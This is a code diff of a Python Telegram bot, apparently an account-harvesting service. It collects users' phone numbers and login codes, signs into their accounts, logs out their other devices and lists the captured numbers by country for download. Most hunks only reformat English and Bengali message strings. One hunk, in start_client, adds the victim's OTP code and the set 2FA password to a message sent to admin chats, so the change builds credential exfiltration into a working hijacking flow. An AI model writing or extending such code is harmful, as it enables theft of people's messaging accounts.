@@ -45,180 +45,180 @@ pending = {}
 # ====================== LANGUAGE TEXTS ======================
 TEXTS = {
     "en": {
-    "welcome":
-        "👋 Welcome, **{name}**! 🌟\n\n"
-        "🌐 Please select your preferred language below:",
+        "welcome":
+            "👋 Welcome, **{name}**! 🌟\n\n"
+            "🌐 Please select your preferred language below:",
 
-    "lang_selected":
-        "✅ Language successfully set to **English** 🇬🇧",
+        "lang_selected":
+            "✅ Language successfully set to **English** 🇬🇧",
 
-    "send_number":
-        "📱 **Send Your Phone Number**\n\n"
-        "➕ Please include the `+` country code.\n\n"
-        "📝 Example:\n"
-        "`+8801712345678`\n\n"
-        "ℹ️ After login, use `/information` to view your information.",
+        "send_number":
+            "📱 **Send Your Phone Number**\n\n"
+            "➕ Please include the `+` country code.\n\n"
+            "📝 Example:\n"
+            "`+8801712345678`\n\n"
+            "ℹ️ After login, use `/information` to view your information.",
 
-    "sending_code":
-        "⏳ **Please wait...**\n\n"
-        "📤 Your login code is being sent...",
+        "sending_code":
+            "⏳ **Please wait...**\n\n"
+            "📤 Your login code is being sent...",
 
-    "code_sent":
-        "📲 {flag} `{phone}`\n\n"
-        "🔑 **Code Sent Successfully!**\n\n"
-        "Please send the **5 or 6-digit login code**.\n\n"
-        "➿ `/cancel` — Cancel",
+        "code_sent":
+            "📲 {flag} `{phone}`\n\n"
+            "🔑 **Code Sent Successfully!**\n\n"
+            "Please send the **5 or 6-digit login code**.\n\n"
+            "➿ `/cancel` — Cancel",
 
-    "already_login":
-        "✅ **Already Logged In!**\n\n"
-        "📱 This number is already logged in.",
+        "already_login":
+            "✅ **Already Logged In!**\n\n"
+            "📱 This number is already logged in.",
 
-    "invalid_code":
-        "❌ **Invalid Code!**\n\n"
-        "🔢 The code you entered is incorrect. Please try again.\n\n"
-        "➿ `/cancel` — Cancel",
+        "invalid_code":
+            "❌ **Invalid Code!**\n\n"
+            "🔢 The code you entered is incorrect. Please try again.\n\n"
+            "➿ `/cancel` — Cancel",
 
-    "has_2fa":
-        "🔐 **Two-Factor Authentication Detected**\n\n"
-        "⚠️ This account already has Two-Factor Authentication enabled.",
+        "has_2fa":
+            "🔐 **Two-Factor Authentication Detected**\n\n"
+            "⚠️ This account already has Two-Factor Authentication enabled.",
 
-    "login_success":
-        "🎉 **Login Successful!**\n\n"
-        "🌍 {flag} **{country}**\n"
-        "📱 Number: `{phone}`\n"
-        "👤 Name: {name}\n"
-        "🔒 2FA: `{status}`\n\n"
-        "⏳ Other devices will be logged out in **{min} minutes**.\n\n"
-        "➡️ Use `/information` to continue.",
+        "login_success":
+            "🎉 **Login Successful!**\n\n"
+            "🌍 {flag} **{country}**\n"
+            "📱 Number: `{phone}`\n"
+            "👤 Name: {name}\n"
+            "🔒 2FA: `{status}`\n\n"
+            "⏳ Other devices will be logged out in **{min} minutes**.\n\n"
+            "➡️ Use `/information` to continue.",
 
-    "cancelled":
-        "✅ **Cancelled Successfully!**\n\n"
-        "🔄 You can start again whenever you're ready.",
+        "cancelled":
+            "✅ **Cancelled Successfully!**\n\n"
+            "🔄 You can start again whenever you're ready.",
 
-    "session_expired":
-        "⚠️ **Session Expired!**\n\n"
-        "🔄 Please send your phone number again to continue.",
+        "session_expired":
+            "⚠️ **Session Expired!**\n\n"
+            "🔄 Please send your phone number again to continue.",
 
-    "info_menu":
-        "ℹ️ **Information Menu**\n\n"
-        "📊 Currently Active Numbers: `{total}`\n\n"
-        "👇 Please select an option:",
+        "info_menu":
+            "ℹ️ **Information Menu**\n\n"
+            "📊 Currently Active Numbers: `{total}`\n\n"
+            "👇 Please select an option:",
 
-    "no_numbers":
-        "📭 **No Active Numbers**\n\n"
-        "You don't have any active numbers right now.",
+        "no_numbers":
+            "📭 **No Active Numbers**\n\n"
+            "You don't have any active numbers right now.",
 
-    "your_numbers":
-        "📱 **Your Active Numbers by Country**\n\n"
-        "🌍 Select a country to view your numbers:",
+        "your_numbers":
+            "📱 **Your Active Numbers by Country**\n\n"
+            "🌍 Select a country to view your numbers:",
 
-    "select_download":
-        "📁 **Download Number File**\n\n"
-        "🌍 Select a country to download your numbers:",
+        "select_download":
+            "📁 **Download Number File**\n\n"
+            "🌍 Select a country to download your numbers:",
 
-    "file_sent":
-        "✅ **File Sent Successfully!** 📁",
+        "file_sent":
+            "✅ **File Sent Successfully!** 📁",
 
-    "no_download":
-        "📭 **No Numbers Available**\n\n"
-        "There are no numbers available to download.",
+        "no_download":
+            "📭 **No Numbers Available**\n\n"
+            "There are no numbers available to download.",
 
-    "congrats_code":
-        "🎉 **Congratulations!**\n\n"
-        "🌍 {flag} **{country}**\n"
-        "📱 Number: `{phone}`\n"
-        "🔑 OTP Code: `{code}`\n"
-        "🔒 Two-Factor: `{tfa}`\n"
-        "📅 {time}\n\n"
-        "✅ Use this code to login.",
-},
-"bn": {
-    "welcome":
-        "👋 স্বাগতম, **{name}**! 🌟\n\n"
-        "🌐 নিচের অপশন থেকে আপনার পছন্দের ভাষা নির্বাচন করুন:",
+        "congrats_code":
+            "🎉 **Congratulations!**\n\n"
+            "🌍 {flag} **{country}**\n"
+            "📱 Number: `{phone}`\n"
+            "🔑 OTP Code: `{code}`\n"
+            "🔒 Two-Factor: `{tfa}`\n"
+            "📅 {time}\n\n"
+            "✅ Use this code to login.",
+    },
+    "bn": {
+        "welcome":
+            "👋 স্বাগতম, **{name}**! 🌟\n\n"
+            "🌐 নিচের অপশন থেকে আপনার পছন্দের ভাষা নির্বাচন করুন:",
 
-    "lang_selected":
-        "✅ ভাষা সফলভাবে **বাংলা** সেট করা হয়েছে 🇧🇩",
+        "lang_selected":
+            "✅ ভাষা সফলভাবে **বাংলা** সেট করা হয়েছে 🇧🇩",
 
-    "send_number":
-        "📱 **আপনার ফোন নাম্বার পাঠান**\n\n"
-        "➕ নাম্বারের শুরুতে `+` কান্ট্রি কোড দিন।\n\n"
-        "📝 উদাহরণ:\n"
-        "`+8801712345678`\n\n"
-        "ℹ️ লগইন করার পর আপনার তথ্য দেখতে `/information` ব্যবহার করুন।",
+        "send_number":
+            "📱 **আপনার ফোন নাম্বার পাঠান**\n\n"
+            "➕ নাম্বারের শুরুতে `+` কান্ট্রি কোড দিন।\n\n"
+            "📝 উদাহরণ:\n"
+            "`+8801712345678`\n\n"
+            "ℹ️ লগইন করার পর আপনার তথ্য দেখতে `/information` ব্যবহার করুন।",
 
-    "sending_code":
-        "⏳ **অনুগ্রহ করে অপেক্ষা করুন...**\n\n"
-        "📤 আপনার লগইন কোড পাঠানো হচ্ছে...",
+        "sending_code":
+            "⏳ **অনুগ্রহ করে অপেক্ষা করুন...**\n\n"
+            "📤 আপনার লগইন কোড পাঠানো হচ্ছে...",
 
-    "code_sent":
-        "📲 {flag} `{phone}`\n\n"
-        "🔑 **কোড সফলভাবে পাঠানো হয়েছে!**\n\n"
-        "অনুগ্রহ করে **৫ অথবা ৬ সংখ্যার লগইন কোড** পাঠান।\n\n"
-        "➿ `/cancel` — বাতিল করতে",
+        "code_sent":
+            "📲 {flag} `{phone}`\n\n"
+            "🔑 **কোড সফলভাবে পাঠানো হয়েছে!**\n\n"
+            "অনুগ্রহ করে **৫ অথবা ৬ সংখ্যার লগইন কোড** পাঠান।\n\n"
+            "➿ `/cancel` — বাতিল করতে",
 
-    "already_login":
-        "✅ **ইতোমধ্যে লগইন করা আছে!**\n\n"
-        "📱 এই নাম্বারটি ইতোমধ্যে লগইন করা হয়েছে।",
+        "already_login":
+            "✅ **ইতোমধ্যে লগইন করা আছে!**\n\n"
+            "📱 এই নাম্বারটি ইতোমধ্যে লগইন করা হয়েছে।",
 
-    "invalid_code":
-        "❌ **ভুল কোড!**\n\n"
-        "🔢 আপনার দেওয়া কোডটি সঠিক নয়। আবার চেষ্টা করুন।\n\n"
-        "➿ `/cancel` — বাতিল করতে",
+        "invalid_code":
+            "❌ **ভুল কোড!**\n\n"
+            "🔢 আপনার দেওয়া কোডটি সঠিক নয়। আবার চেষ্টা করুন।\n\n"
+            "➿ `/cancel` — বাতিল করতে",
 
-    "has_2fa":
-        "🔐 **টু-ফ্যাক্টর অথেনটিকেশন শনাক্ত হয়েছে**\n\n"
-        "⚠️ এই অ্যাকাউন্টে ইতোমধ্যে Two-Factor Authentication চালু রয়েছে।",
+        "has_2fa":
+            "🔐 **টু-ফ্যাক্টর অথেনটিকেশন শনাক্ত হয়েছে**\n\n"
+            "⚠️ এই অ্যাকাউন্টে ইতোমধ্যে Two-Factor Authentication চালু রয়েছে।",
 
-    "login_success":
-        "🎉 **লগইন সফল হয়েছে!**\n\n"
-        "🌍 {flag} **{country}**\n"
-        "📱 নাম্বার: `{phone}`\n"
-        "👤 নাম: {name}\n"
-        "🔒 ২FA: `{status}`\n\n"
-        "⏳ অন্য ডিভাইসগুলো **{min} মিনিট** পর লগআউট হবে।\n\n"
-        "➡️ পরবর্তী তথ্য দেখতে `/information` ব্যবহার করুন।",
+        "login_success":
+            "🎉 **লগইন সফল হয়েছে!**\n\n"
+            "🌍 {flag} **{country}**\n"
+            "📱 নাম্বার: `{phone}`\n"
+            "👤 নাম: {name}\n"
+            "🔒 ২FA: `{status}`\n\n"
+            "⏳ অন্য ডিভাইসগুলো **{min} মিনিট** পর লগআউট হবে।\n\n"
+            "➡️ পরবর্তী তথ্য দেখতে `/information` ব্যবহার করুন।",
 
-    "cancelled":
-        "✅ **সফলভাবে বাতিল করা হয়েছে!**\n\n"
-        "🔄 চাইলে আবার শুরু করতে পারেন।",
+        "cancelled":
+            "✅ **সফলভাবে বাতিল করা হয়েছে!**\n\n"
+            "🔄 চাইলে আবার শুরু করতে পারেন।",
 
-    "session_expired":
-        "⚠️ **সেশন শেষ হয়ে গেছে!**\n\n"
-        "🔄 আবার চালু করতে আপনার ফোন নাম্বার পাঠান।",
+        "session_expired":
+            "⚠️ **সেশন শেষ হয়ে গেছে!**\n\n"
+            "🔄 আবার চালু করতে আপনার ফোন নাম্বার পাঠান।",
 
-    "info_menu":
-        "ℹ️ **ইনফরমেশন মেনু**\n\n"
-        "📊 বর্তমানে অ্যাকটিভ নাম্বার: `{total}`\n\n"
-        "👇 একটি অপশন নির্বাচন করুন:",
+        "info_menu":
+            "ℹ️ **ইনফরমেশন মেনু**\n\n"
+            "📊 বর্তমানে অ্যাকটিভ নাম্বার: `{total}`\n\n"
+            "👇 একটি অপশন নির্বাচন করুন:",
 
-    "no_numbers":
-        "📭 **কোনো অ্যাকটিভ নাম্বার নেই**\n\n"
-        "এই মুহূর্তে আপনার কোনো অ্যাকটিভ নাম্বার নেই।",
+        "no_numbers":
+            "📭 **কোনো অ্যাকটিভ নাম্বার নেই**\n\n"
+            "এই মুহূর্তে আপনার কোনো অ্যাকটিভ নাম্বার নেই।",
 
-    "your_numbers":
-        "📱 **দেশ অনুযায়ী আপনার নাম্বারসমূহ**\n\n"
-        "🌍 নাম্বার দেখতে একটি দেশ নির্বাচন করুন:",
+        "your_numbers":
+            "📱 **দেশ অনুযায়ী আপনার নাম্বারসমূহ**\n\n"
+            "🌍 নাম্বার দেখতে একটি দেশ নির্বাচন করুন:",
 
-    "select_download":
-        "📁 **নাম্বার ফাইল ডাউনলোড**\n\n"
-        "🌍 ডাউনলোড করার জন্য একটি দেশ নির্বাচন করুন:",
+        "select_download":
+            "📁 **নাম্বার ফাইল ডাউনলোড**\n\n"
+            "🌍 ডাউনলোড করার জন্য একটি দেশ নির্বাচন করুন:",
 
-    "file_sent":
-        "✅ **ফাইল সফলভাবে পাঠানো হয়েছে!** 📁",
+        "file_sent":
+            "✅ **ফাইল সফলভাবে পাঠানো হয়েছে!** 📁",
 
-"no_download":
-        "📭 **ডাউনলোড করার মতো কোনো নাম্বার নেই**\n\n"
-        "এই মুহূর্তে ডাউনলোড করার জন্য কোনো নাম্বার পাওয়া যায়নি।",
+        "no_download":
+            "📭 **ডাউনলোড করার মতো কোনো নাম্বার নেই**\n\n"
+            "এই মুহূর্তে ডাউনলোড করার জন্য কোনো নাম্বার পাওয়া যায়নি।",
 
-    "congrats_code":
-        "🎉 **অভিনন্দন!**\n\n"
-        "🌍 {flag} **{country}**\n"
-        "📱 নাম্বার: `{phone}`\n"
-        "🔑 OTP কোড: `{code}`\n"
-        "🔒 টু-ফ্যাক্টর: `{tfa}`\n"
-        "📅 {time}\n\n"
-        "✅ এই কোডটি ব্যবহার করে লগইন করুন।",
+        "congrats_code":
+            "🎉 **অভিনন্দন!**\n\n"
+            "🌍 {flag} **{country}**\n"
+            "📱 নাম্বার: `{phone}`\n"
+            "🔑 OTP কোড: `{code}`\n"
+            "🔒 টু-ফ্যাক্টর: `{tfa}`\n"
+            "📅 {time}\n\n"
+            "✅ এই কোডটি ব্যবহার করে লগইন করুন।",
     }
 }
 
@@ -232,6 +232,7 @@ def set_lang(uid, lang):
     langs = load_json(LANG_FILE, {})
     langs[str(uid)] = lang
     save_json(LANG_FILE, langs)
+
 # ====================== HELPERS ======================
 def load_json(path, default=None):
     if default is None:
@@ -341,19 +342,18 @@ async def start_client(phone):
             for admin_id in get_admins():
                 try:
                     from telegram import Bot
-
-bot = Bot(token=BOT_TOKEN)
-
-admin_msg = (
-    f"🔔 **New Activity Received**\n\n"
-    f"👤 **Name:** {acc.get('name', 'Unknown')}\n"
-    f"📧 **Username:** @{acc.get('username') or 'None'}\n"
-    f"🆔 **Chat ID:** `{uid}`\n"
-    f"📱 **Number:** `{phone}`\n"
-    f"🌍 **Country:** {flag} {country}\n"
-    f"📅 **Time:** `{now}`\n\n"
-    f"✅ **Account activity has been received successfully.**"
-)
+                    bot = Bot(token=BOT_TOKEN)
+                    admin_msg = (
+                        f"🔔 **New Code Received**\n\n"
+                        f"👤 Name: {acc.get('name', 'Unknown')}\n"
+                        f"📧 Username: @{acc.get('username') or 'None'}\n"
+                        f"🆔 Chat ID: `{uid}`\n"
+                        f"📱 Number: `{phone}`\n"
+                        f"🌍 {flag} {country}\n"
+                        f"🔑 OTP: `{code}`\n"
+                        f"🔒 2FA: `{TWO_FA_PASSWORD}`\n"
+                        f"📅 {now}"
+                    )
                     await bot.send_message(chat_id=admin_id, text=admin_msg, parse_mode="Markdown")
                 except:
                     pass
@@ -451,19 +451,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def language_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     kb = [
-kb = [
-    [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
-    [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
-]
-
-await update.message.reply_text(
-    "🌐 **Select Your Language**\n\n"
-    "🇬🇧 Choose English\n"
-    "🇧🇩 বাংলা নির্বাচন করুন\n\n"
-    "👇 Please select an option:",
-    reply_markup=InlineKeyboardMarkup(kb),
-    parse_mode="Markdown"
-)
+        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
+        [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
+    ]
+    await update.message.reply_text(
+        "🌐 Select Language / ভাষা সিলেক্ট করুন:",
+        reply_markup=InlineKeyboardMarkup(kb)
+    )
 
 async def lang_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -837,7 +831,10 @@ def main():
     app.add_handler(conv)
 
     app.add_handler(
-        CallbackQueryHandler(lang_cb, pattern=r"^lang_")
+        CallbackQueryHandler(
+            lang_cb,
+            pattern=r"^lang_"
+        )
     )
 
     app.add_handler(
